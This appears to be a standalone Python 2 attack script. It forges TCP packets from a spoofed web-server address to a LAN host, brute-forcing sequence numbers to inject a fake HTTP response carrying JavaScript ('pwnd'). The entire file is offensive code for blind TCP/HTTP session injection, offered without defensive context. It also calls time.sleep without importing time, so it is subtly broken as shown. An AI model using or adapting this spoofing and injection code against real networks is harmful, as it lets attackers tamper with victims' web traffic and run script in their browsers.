#!/usr/bin/python

import socket
import dpkt
import dnet
import sys



net = dnet.ip()

HTTP = ' '*100 + '''HTTP/1.1 200
Content-Type: text/html;

<h1>Hi.</h1><script type="text/javascript">alert('pwnd');</script>'''


def make_pkt(dport, seq):
    ip = dpkt.ip.IP(src=socket.inet_aton('69.171.229.11'), \
        dst=socket.inet_aton('192.168.1.113'), p=0x06)
    tcp = dpkt.tcp.TCP(sport=80, dport=dport, data=HTTP, flags=0, seq=seq)

    ip.data = tcp
    ip.len += len(ip.data)


    return ip

print 'gogogogo'
seq_start = int(sys.argv[2])


for seq in range(seq_start, 0, -len(HTTP)):
    net.send(str(make_pkt(int(sys.argv[1]), seq)))
    time.sleep(0.0001)

print 'done :/'

